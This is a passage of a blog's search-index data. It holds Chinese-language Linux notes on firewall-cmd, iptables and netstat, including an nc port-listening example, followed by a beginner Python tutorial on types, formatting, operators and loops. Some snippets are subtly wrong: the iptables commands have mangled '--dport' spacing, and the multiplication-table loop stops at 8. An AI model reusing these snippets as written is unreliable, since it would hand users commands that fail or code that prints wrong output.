title=\"7.查看版本\"></a>7.查看版本</h2><p>firewall-cmd –version</p>\n<h2 id=\"8-查看帮助\"><a href=\"#8-查看帮助\" class=\"headerlink\" title=\"8.查看帮助\"></a>8.查看帮助</h2><p>firewall-cmd –help</p>\n<h2 id=\"9-查看区域信息\"><a href=\"#9-查看区域信息\" class=\"headerlink\" title=\"9.查看区域信息\"></a>9.查看区域信息</h2><p>firewall-cmd –get-active-zones</p>\n<h2 id=\"10-查看指定接口所属区域信息\"><a href=\"#10-查看指定接口所属区域信息\" class=\"headerlink\" title=\"10.查看指定接口所属区域信息\"></a>10.查看指定接口所属区域信息</h2><p>firewall-cmd –get-zone-of-interface=eth0</p>\n<h2 id=\"11-拒绝所有包\"><a href=\"#11-拒绝所有包\" class=\"headerlink\" title=\"11.拒绝所有包\"></a>11.拒绝所有包</h2><p>firewall-cmd –panic-on</p>\n<h2 id=\"12-取消拒绝状态\"><a href=\"#12-取消拒绝状态\" class=\"headerlink\" title=\"12.取消拒绝状态\"></a>12.取消拒绝状态</h2><p>firewall-cmd –panic-off</p>\n<h2 id=\"13-查看是否拒绝\"><a href=\"#13-查看是否拒绝\" class=\"headerlink\" title=\"13.查看是否拒绝\"></a>13.查看是否拒绝</h2><p>firewall-cmd –query-panic</p>\n<h2 id=\"14-将接口添加到区域-默认接口都在public\"><a href=\"#14-将接口添加到区域-默认接口都在public\" class=\"headerlink\" title=\"14.将接口添加到区域(默认接口都在public)\"></a>14.将接口添加到区域(默认接口都在public)</h2><p>firewall-cmd –zone=public –add-interface=eth0(永久生效再加上 –permanent 然后reload防火墙)</p>\n<h2 id=\"15-设置默认接口区域\"><a href=\"#15-设置默认接口区域\" class=\"headerlink\" title=\"15.设置默认接口区域\"></a>15.设置默认接口区域</h2><p>firewall-cmd –set-default-zone=public(立即生效，无需重启)</p>\n<h2 id=\"16-更新防火墙规则\"><a href=\"#16-更新防火墙规则\" class=\"headerlink\" title=\"16.更新防火墙规则\"></a>16.更新防火墙规则</h2><p>firewall-cmd –reload或firewall-cmd –complete-reload(两者的区别就是第一个无需断开连接，就是firewalld特性之一动态</p>\n<p>添加规则，第二个需要断开连接，类似重启服务)</p>\n<h2 id=\"17-查看指定区域所有打开的端口\"><a href=\"#17-查看指定区域所有打开的端口\" class=\"headerlink\" title=\"17.查看指定区域所有打开的端口\"></a>17.查看指定区域所有打开的端口</h2><p>firewall-cmd –zone=public –list-ports</p>\n<h2 id=\"18-在指定区域打开端口（记得重启防火墙）\"><a href=\"#18-在指定区域打开端口（记得重启防火墙）\" class=\"headerlink\" title=\"18.在指定区域打开端口（记得重启防火墙）\"></a>18.在指定区域打开端口（记得重启防火墙）</h2><p>firewall-cmd –zone=public –add-port=80/tcp(永久生效再加上 –permanent)</p>\n<p>说明：</p>\n<p>–zone 作用域</p>\n<p>–add-port=8080/tcp 添加端口，格式为：端口/通讯协议</p>\n<p>–permanent #永久生效，没有此参数重启后失效</p>\n<p>一、查看哪些端口被打开 netstat -anp</p>\n<p>二、关闭端口号:</p>\n<p><code>iptables -A OUTPUT -p tcp - -dport 端口号-j DROP</code></p>\n<p>1</p>\n<p>三、打开端口号：</p>\n<p><code>iptables -A INPUT -ptcp - -dport 端口号-j ACCEPT</code></p>\n<p>1</p>\n<p>四、保存设置</p>\n<p>service iptables save</p>\n<p>1</p>\n<p>五、以下是linux打开端口命令的使用方法。</p>\n<p>　　nc -lp 23 &amp;(打开23端口，即telnet)</p>\n<p>　　netstat -an | grep 23 (查看是否打开23端口)</p>\n<p>六、linux打开端口命令每一个打开的端口，都需要有相应的监听程序才可以</p>\n<p>检查更新防火墙规则：</p>\n<p>firewall-cmd –list-all</p>\n","categories":["linux"],"tags":["基础"]},{"title":"python基础二","url":"/2022/08/17/Python%E5%9F%BA%E7%A1%80%E4%BA%8C/","content":"<h1 id=\"myfirstpython\"><a href=\"#myfirstpython\" class=\"headerlink\" title=\"myfirstpython\"></a>myfirstpython</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 注释1</span><br><span class=\"line\">print(&quot;Hello world&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;Hello python&quot;)  #</span><br><span class=\"line\"></span><br><span class=\"line\"># 注释2</span><br><span class=\"line\"></span><br><span class=\"line\">myName = &#x27;Tom&#x27;</span><br><span class=\"line\">print(myName)</span><br><span class=\"line\">SchoolName = &#x27;饿啊谔谔我的是&#x27;</span><br><span class=\"line\">print(SchoolName)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># int -- 整型</span><br><span class=\"line\">num1 = 1</span><br><span class=\"line\"># float -- 浮点型</span><br><span class=\"line\">num2 = 1.1</span><br><span class=\"line\">print(type(num1))</span><br><span class=\"line\">print(type(num2))</span><br><span class=\"line\"># str -- 字符串，带引号</span><br><span class=\"line\">a = &quot;Hello world&quot;</span><br><span class=\"line\">print(type(a))</span><br><span class=\"line\"># bool -- 布尔型，通常判断使用，两个取值True, false</span><br><span class=\"line\">b = True</span><br><span class=\"line\">print(type(b))</span><br><span class=\"line\"># list -- 列表</span><br><span class=\"line\">c = [10, 20, 30]</span><br><span class=\"line\">print(type(c))</span><br><span class=\"line\"># tuple -- 元组</span><br><span class=\"line\">d = (10, 20, 30)</span><br><span class=\"line\">print(type(d))</span><br><span class=\"line\"># set -- 集合</span><br><span class=\"line\">e = &#123;10, 20, 30&#125;</span><br><span class=\"line\">print(type(e))</span><br><span class=\"line\"># dict -- 字典 -- 键值对</span><br><span class=\"line\">f = &#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: &#x27;18&#x27;&#125;</span><br><span class=\"line\">print(type(f))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"格式化输出\"><a href=\"#格式化输出\" class=\"headerlink\" title=\"格式化输出\"></a>格式化输出</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 准备数据</span><br><span class=\"line\">2. 格式化符号输出数据</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">age = 18</span><br><span class=\"line\">name = &#x27;Tom&#x27;</span><br><span class=\"line\">weight = 75.5</span><br><span class=\"line\">stu_id = 1</span><br><span class=\"line\">stu_id2 = 1000</span><br><span class=\"line\"># 1. 今年我的年龄是x岁 -- 整数 %d</span><br><span class=\"line\">print(&#x27;age is %d years old&#x27; % age)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 我的名字是x -- 字符串 %s</span><br><span class=\"line\">print(&#x27;my name is %s&#x27; % name)</span><br><span class=\"line\"># 3. 我的体重是x公斤 -- 浮点数 %f</span><br><span class=\"line\">print(&#x27;my weight is %.2f kilogram&#x27; % weight)</span><br><span class=\"line\"># 4. 我的学号是x -- %d</span><br><span class=\"line\">print(&#x27;my student ID is %d&#x27; % stu_id)</span><br><span class=\"line\"># 4.1. 我的学号是001</span><br><span class=\"line\">print(&#x27;my student ID is %03d&#x27; % stu_id)</span><br><span class=\"line\">print(&#x27;my student ID is %03d&#x27; % stu_id2)</span><br><span class=\"line\"># 5. 我的名字是x，今年x岁了</span><br><span class=\"line\">print(&#x27;my name is %s, age is %d years old&#x27; % (name, age))</span><br><span class=\"line\"># 5.1. 我的名字是x，明年x岁了</span><br><span class=\"line\">print(&#x27;my name is %s, next year, I am %d years old&#x27; % (name, age+1))</span><br><span class=\"line\"># 6. 我的名字是x，今年x岁了，体重x公斤，学号是x</span><br><span class=\"line\">print(&#x27;my name is %s, age is %d years old, weight is %.2f kilogram, student ID is %06d&#x27; % (name, age, weight, stu_id))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"格式化字符串拓展\"><a href=\"#格式化字符串拓展\" class=\"headerlink\" title=\"格式化字符串拓展\"></a>格式化字符串拓展</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name = &#x27;Tom&#x27;</span><br><span class=\"line\">age = 18</span><br><span class=\"line\">weight = 75.5</span><br><span class=\"line\"></span><br><span class=\"line\"># 我的名字是x, 今年x岁了， 体重x公斤</span><br><span class=\"line\">print(&#x27;my name is %s, age is %s years old, weight is %s kilogram&#x27; % (name, age, weight))</span><br><span class=\"line\"></span><br><span class=\"line\"># 格式化字符串 -- 语法 f&#x27;&#123;表达式&#125;&#x27;</span><br><span class=\"line\">print(f&#x27;my name is &#123;name&#125;, age is &#123;age+1&#125; years old&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"转义字符\"><a href=\"#转义字符\" class=\"headerlink\" title=\"转义字符\"></a>转义字符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;hello&#x27;)</span><br><span class=\"line\">print(&#x27;world&#x27;)</span><br><span class=\"line\"># \\n -- 换行</span><br><span class=\"line\">print(&#x27;hello\\npython&#x27;)</span><br><span class=\"line\"># \\t -- 制表符，tab四个空格距离</span><br><span class=\"line\">print(&#x27;\\tabcd&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"print的结束符\"><a href=\"#print的结束符\" class=\"headerlink\" title=\"print的结束符\"></a>print的结束符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># print默认自带\\n结束符</span><br><span class=\"line\">print(&#x27;hello&#x27;, end=&quot;\\n&quot;)</span><br><span class=\"line\">print(&#x27;world&#x27;, end=&quot;\\t&quot;)</span><br><span class=\"line\">print(&#x27;hello&#x27;, end=&quot;...&quot;)</span><br><span class=\"line\">print(&#x27;python&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"输入\"><a href=\"#输入\" class=\"headerlink\" title=\"输入\"></a>输入</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 书写input</span><br><span class=\"line\">    input(&#x27;提示信息&#x27;)</span><br><span class=\"line\">2. 观察特点</span><br><span class=\"line\">    2.1. 遇到input，等待用户输入</span><br><span class=\"line\">    2.2. 接收input存变量</span><br><span class=\"line\">    2.3. input接收到的数据类型都是字符串</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">password = input(&#x27;please input your password: &#x27;)</span><br><span class=\"line\">print(f&#x27;The password you just inputted is &#123;password&#125;&#x27;)</span><br><span class=\"line\">print(type(password))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. input</span><br><span class=\"line\">2. 检测input数据类型str</span><br><span class=\"line\">3. int() 转换数据类型</span><br><span class=\"line\">4. 检测是否转换成功</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">num = input(&#x27;please input number: &#x27;)</span><br><span class=\"line\">print(num)</span><br><span class=\"line\">print(type(num)) # str</span><br><span class=\"line\">print(type(int(num)))</span><br><span class=\"line\">num1= int(num)</span><br><span class=\"line\">print(type(num1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 1. float() -- 将数据转换成浮点数</span><br><span class=\"line\">num = 1</span><br><span class=\"line\">str1 = &#x27;10&#x27;</span><br><span class=\"line\">print(type(float(num1)))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. str() -- 将数据转换成字符串</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. tuple() -- 将一个序列转换成元组</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. list() -- 将一个序列转换成列表</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. eval() -- 计算在字符串中的有效python表达式， 并返回一个对象</span><br><span class=\"line\">str2 = &#x27;1&#x27;</span><br><span class=\"line\">str3 = &#x27;1.1&#x27;</span><br><span class=\"line\">str4 = &#x27;(1000, 2000, 300)&#x27;</span><br><span class=\"line\">str5 = &#x27;[1000, 2000, 3000]&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"数据类型转换进阶\"><a href=\"#数据类型转换进阶\" class=\"headerlink\" title=\"数据类型转换进阶\"></a>数据类型转换进阶</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. float() -- 将数据转换成浮点数</span><br><span class=\"line\">num1 = 1</span><br><span class=\"line\">str1 = &#x27;10&#x27;</span><br><span class=\"line\">print(type(float(num1)))</span><br><span class=\"line\">print(float(num1))</span><br><span class=\"line\"></span><br><span class=\"line\">print(float(str1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. str() -- 将数据转换成字符串</span><br><span class=\"line\">print(type(str(num1)))</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. tuple() -- 将一个序列转换成元组</span><br><span class=\"line\">list1 = [10, 20, 30]</span><br><span class=\"line\">print(tuple(list1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. list() -- 将一个序列转换成列表</span><br><span class=\"line\">t1 = (100, 200, 300)</span><br><span class=\"line\">print(list(t1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. eval() -- 计算在字符串中的有效python表达式， 并返回一个对象</span><br><span class=\"line\">str2 = &#x27;1&#x27;  # -- 对应整型</span><br><span class=\"line\">str3 = &#x27;1.1&#x27;   # -- 对应浮点型</span><br><span class=\"line\">str4 = &#x27;(1000, 2000, 300)&#x27;  # -- 对应元组</span><br><span class=\"line\">str5 = &#x27;[1000, 2000, 3000]&#x27;  # -- 对应列表</span><br><span class=\"line\">print(type(eval(str2)))</span><br><span class=\"line\">print(type(eval(str3)))</span><br><span class=\"line\">print(type(eval(str4)))</span><br><span class=\"line\">print(type(eval(str5)))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"复合赋值运算符\"><a href=\"#复合赋值运算符\" class=\"headerlink\" title=\"复合赋值运算符\"></a>复合赋值运算符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = b = c = d = e = f = g = 10</span><br><span class=\"line\">a += 1  # a = a + 1</span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\">b -= 1  # b = b - 1</span><br><span class=\"line\">print(b)</span><br><span class=\"line\"></span><br><span class=\"line\">c *= 2  # c = c * 2</span><br><span class=\"line\">print(c)</span><br><span class=\"line\"></span><br><span class=\"line\">d /= 2  # d = d / 2</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br><span class=\"line\">e //= 3  # e = e // 3 整除赋值</span><br><span class=\"line\">print(e)</span><br><span class=\"line\"></span><br><span class=\"line\">f %= 3  # f = f % 3 取余赋值</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\">g **= 2  # g = g ** 2 幂赋值</span><br><span class=\"line\">print(g)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 注意： 先算复合赋值运算符右面的表达式， 再算复合赋值运算</span><br><span class=\"line\">h = 10</span><br><span class=\"line\">h += 1 + 2</span><br><span class=\"line\">print(h)</span><br><span class=\"line\"></span><br><span class=\"line\">h1 = 10</span><br><span class=\"line\">h1 *= 1 + 2</span><br><span class=\"line\">print(h1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"逻辑运算符\"><a href=\"#逻辑运算符\" class=\"headerlink\" title=\"逻辑运算符\"></a>逻辑运算符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = 0</span><br><span class=\"line\">b = 1</span><br><span class=\"line\">c = 2</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. and: 与： 都真才真</span><br><span class=\"line\">print((a &lt; b) and (c &gt; b)) # 加小括号避免歧义</span><br><span class=\"line\">print(a &gt; b and c &gt; b)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. or: 或： 一真则真，都假才假</span><br><span class=\"line\">print(a &lt; b or c &gt; b)</span><br><span class=\"line\">print(a &gt; b or c &gt; b)</span><br><span class=\"line\">print(a &gt; b or c &lt; b)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. not: 非： 取反</span><br><span class=\"line\">print(not False)</span><br><span class=\"line\">print(not c &gt; b)</span><br><span class=\"line\"></span><br><span class=\"line\"># 数字之间的逻辑运算</span><br><span class=\"line\"></span><br><span class=\"line\"># 1） and运算符，只要有一个值为0，则结果为0，否则结果为最后一个非0数字</span><br><span class=\"line\">print(a and b) # 0</span><br><span class=\"line\">print(b and c, end=&#x27;\\t&#x27;) # 2</span><br><span class=\"line\">print(c and b, end=&#x27;...&#x27;) # 1</span><br><span class=\"line\"></span><br><span class=\"line\"># 2) or运算符，只有所有值都为0结果才为0，否则结果为第一个非0数字</span><br><span class=\"line\">print(a or b) # 1</span><br><span class=\"line\">print(f&#x27;a或c的结果为：&#123;a or c&#125;&#x27;, end=&quot;,,,&quot;) # 2</span><br><span class=\"line\">print(b or c) # 1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"if语句\"><a href=\"#if语句\" class=\"headerlink\" title=\"if语句\"></a>if语句</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 系统可以用户输入年龄，用这个年龄做条件判断</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 用户输入</span><br><span class=\"line\">2. 保存用户输入的年龄</span><br><span class=\"line\">3. if</span><br><span class=\"line\">注意： input接收到的数据是str, 不能和18做判断 -- int转换类型</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">age = int(input(&#x27;please input your age: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">if age &gt;=18:</span><br><span class=\"line\">    print(f&#x27;your age is &#123;age&#125;, you are an edult&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(f&#x27;your age is &#123;age&#125;, you are a child&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#注意： 在这个下方的没有加缩进的代码，不属于if语句块，即和条件成立与否无关</span><br><span class=\"line\">print(&#x27;this code always execute&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"多重判断\"><a href=\"#多重判断\" class=\"headerlink\" title=\"多重判断\"></a>多重判断</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">age = int(input(&#x27;please input your age: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">if age &lt; 18:</span><br><span class=\"line\">    print(f&#x27;your age is &#123;age&#125;, child&#x27;)</span><br><span class=\"line\">elif (age &gt;= 18) and (age &lt;= 60):  # 也可写成18 &lt;= age &lt;= 60</span><br><span class=\"line\">    print(f&#x27;your age is &#123;age&#125;, legal&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elif age &gt; 60:</span><br><span class=\"line\">    print(f&#x27;your age is &#123;age&#125;, retire&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># if嵌套</span><br><span class=\"line\"></span><br><span class=\"line\">money = 0</span><br><span class=\"line\">seat = 1</span><br><span class=\"line\"></span><br><span class=\"line\">if money == 1:</span><br><span class=\"line\">    print(&#x27;you can get in&#x27;)</span><br><span class=\"line\">    if seat == 1:</span><br><span class=\"line\">        print(&#x27;you can sit down&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;no seat, please wait&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;please stay out&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"综合案例-猜拳游戏\"><a href=\"#综合案例-猜拳游戏\" class=\"headerlink\" title=\"综合案例-猜拳游戏\"></a>综合案例-猜拳游戏</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 出拳</span><br><span class=\"line\">    玩家： 手动输入</span><br><span class=\"line\">    电脑：1. 固定：剪刀 2. 随机</span><br><span class=\"line\">2. 判断输赢</span><br><span class=\"line\">    2.1 玩家获胜</span><br><span class=\"line\">    2.2 平局</span><br><span class=\"line\">    2.3 电脑获胜</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">import random # 导入模块</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">player = int(input(&#x27;please throw a punch: 0 -- rock, 1 -- paper, 2 -- scissors: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">computer = random.randint(0, 2) # 使用模块</span><br><span class=\"line\">print(f&#x27;computer is &#123;computer&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 玩家获胜</span><br><span class=\"line\">if ((player == 0) and (computer == 2)) or ((player == 1) and (computer == 0)) or ((player == 2) and (computer == 1)):</span><br><span class=\"line\">    print(&#x27;player win&#x27;)</span><br><span class=\"line\"># 平局</span><br><span class=\"line\">elif player == computer:</span><br><span class=\"line\">    print(&#x27;draw&#x27;)</span><br><span class=\"line\"># 电脑获胜</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;computer win&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三目运算符\"><a href=\"#三目运算符\" class=\"headerlink\" title=\"三目运算符\"></a>三目运算符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">语法</span><br><span class=\"line\">条件成立的表达式if条件else条件不成立执行的表达式</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">a = 10</span><br><span class=\"line\">b = 6</span><br><span class=\"line\"></span><br><span class=\"line\">c = a - b if a &gt; b else b - a</span><br><span class=\"line\">print(c)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"while循环\"><a href=\"#while循环\" class=\"headerlink\" title=\"while循环\"></a>while循环</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">while 条件：</span><br><span class=\"line\">    条件成立要重复执行的代码</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">i = 0 # 初始值一般设置0</span><br><span class=\"line\">while i &lt; 5: # 循环上限一般写 &lt;</span><br><span class=\"line\">    print(&#x27;This is while loop&#x27;)</span><br><span class=\"line\">    i += 1</span><br><span class=\"line\">print(&#x27;This is end&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 计算1 - 100的累加和</span><br><span class=\"line\"></span><br><span class=\"line\">a = 0</span><br><span class=\"line\">b = 0</span><br><span class=\"line\">while a &lt;= 100:</span><br><span class=\"line\">    b += a</span><br><span class=\"line\">    a += 1</span><br><span class=\"line\">print(&#x27;The sum from 1 to 100 is&#x27;, b)</span><br><span class=\"line\"></span><br><span class=\"line\"># 计算1 - 100偶数的累加和</span><br><span class=\"line\"></span><br><span class=\"line\">c = 1</span><br><span class=\"line\">d = 0</span><br><span class=\"line\">while c &lt;= 100:</span><br><span class=\"line\">    if c % 2 == 0:</span><br><span class=\"line\">        d += c</span><br><span class=\"line\">    c += 1</span><br><span class=\"line\">print(&#x27;Sum of even Numbers up to 100 is&#x27;, d)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"break-continue语句\"><a href=\"#break-continue语句\" class=\"headerlink\" title=\"break, continue语句\"></a>break, continue语句</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># break: 当某些条件成立，退出整个循环</span><br><span class=\"line\"></span><br><span class=\"line\">i = 1</span><br><span class=\"line\">while i &lt;= 5:</span><br><span class=\"line\">    if i == 4:</span><br><span class=\"line\">        print(&#x27;I am full&#x27;)</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(f&#x27;Already ate &#123;i&#125; apples&#x27;)</span><br><span class=\"line\">    i += 1</span><br><span class=\"line\"></span><br><span class=\"line\"># continue: 当条件成立，退出当前一次循环，继而执行下一次循环</span><br><span class=\"line\"></span><br><span class=\"line\">a = 1</span><br><span class=\"line\"></span><br><span class=\"line\">while a &lt;= 5:</span><br><span class=\"line\">    if a == 3:</span><br><span class=\"line\">        print(&#x27;There is a worm in the apple&#x27;)</span><br><span class=\"line\">        # 如果使用continue， 在continue之前，一定要修改计数器，否则进入死循环</span><br><span class=\"line\">        a += 1</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    print(f&#x27;Already ate &#123;a&#125; apples&#x27;)</span><br><span class=\"line\">    a += 1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"while循环嵌套\"><a href=\"#while循环嵌套\" class=\"headerlink\" title=\"while循环嵌套\"></a>while循环嵌套</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">j = 0</span><br><span class=\"line\">while j &lt; 5:</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    while i &lt; 5:</span><br><span class=\"line\">        # 一行星星在同一行显示</span><br><span class=\"line\">        print(&#x27;*&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\">        i += 1</span><br><span class=\"line\">        # 重复5行星星，换行输出</span><br><span class=\"line\">    print(end=&#x27;\\n&#x27;) # 或 print()</span><br><span class=\"line\">    j += 1</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 三角形：每行星星的个数和行号相等</span><br><span class=\"line\"></span><br><span class=\"line\">a = 0</span><br><span class=\"line\">while a &lt; 5:</span><br><span class=\"line\">    b = 0</span><br><span class=\"line\">    # 星星个数i要与行号j联动</span><br><span class=\"line\">    while b &lt;= a:</span><br><span class=\"line\">        print(&#x27;*&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\">        b += 1</span><br><span class=\"line\">    print(end=&#x27;\\n&#x27;) # 或 print()</span><br><span class=\"line\">    a += 1</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 打印9x9乘法表</span><br><span class=\"line\"></span><br><span class=\"line\">c = 1</span><br><span class=\"line\">while c &lt; 9:</span><br><span class=\"line\">    d = 1</span><br><span class=\"line\">    # 星星个数i要与行号j联动</span><br><span class=\"line\">    while d &lt;= c:</span><br><span class=\"line\">        print(f&#x27;&#123;c&#125;x&#123;d&#125;=&#123;c * d&#125;&#x27;, end=&#x27;\\t&#x27;) # \\t制表符可对齐</span><br><span class=\"line\">        d += 1</span><br><span class=\"line\">    print(end=&#x27;\\n&#x27;) # 或 print()</span><br><span class=\"line\">    c += 1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"for循环\"><a href=\"#for循环\" class=\"headerlink\" title=\"for循环\"></a>for循环</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">for循环用法：</span><br><span class=\"line\">    for 临时变量 in 序列：</span><br><span class=\"line\">    重复执行的代码</span><br><span class=\"line\">    .......</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 准备一个数据序列(一个数据内部由多个数据组成，比如列表list，字符串)</span><br><span class=\"line\">2. for</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;forloop&#x27;</span><br><span class=\"line\">for i in str1:</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># break 退出循环</span><br><span class=\"line\"></span><br><span class=\"line\">str2 = &#x27;forloop&#x27;</span><br><span class=\"line\">for j in str2:</span><br><span class=\"line\">    if j == &#x27;l&#x27;:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># continue 退出循环</span><br><span class=\"line\"></span><br><span class=\"line\">str3 = &#x27;forloop&#x27;</span><br><span class=\"line\">for h in str3:</span><br><span class=\"line\">    if h == &#x27;l&#x27;:</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    print(h)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"while…else用法\"><a href=\"#while…else用法\" class=\"headerlink\" title=\"while…else用法\"></a>while…else用法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># while循环完成之后才执行else之后的代码</span><br><span class=\"line\"></span><br><span class=\"line\">i = 1</span><br><span class=\"line\">while i &lt;= 5:</span><br><span class=\"line\">    print(f&#x27;Already ate &#123;i&#125; apples&#x27;)</span><br><span class=\"line\">    i += 1</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;I am full just when i eat the 5th apple&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># break退出循环对else的影响</span><br><span class=\"line\"></span><br><span class=\"line\">j = 1</span><br><span class=\"line\">while j &lt;= 5:</span><br><span class=\"line\">    if j == 3:</span><br><span class=\"line\">        print(&#x27;There is a worm in this apple&#x27;)</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(f&#x27;Already ate 